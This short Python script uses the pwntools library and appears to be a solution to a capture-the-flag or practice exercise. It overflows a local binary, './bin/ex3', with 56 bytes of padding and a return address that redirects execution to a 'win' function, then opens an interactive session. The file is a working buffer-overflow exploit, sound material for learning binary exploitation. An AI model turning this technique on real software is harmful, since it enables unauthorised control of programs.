#!/usr/bin/env python3

from pwn import *


target = process("./bin/ex3")

win_address = p64(0x0000000000401156)

padding = b"A" * 56

payload = padding + win_address

target.sendline(payload)

output = target.recvall()

print(output.decode())


target.interactive()

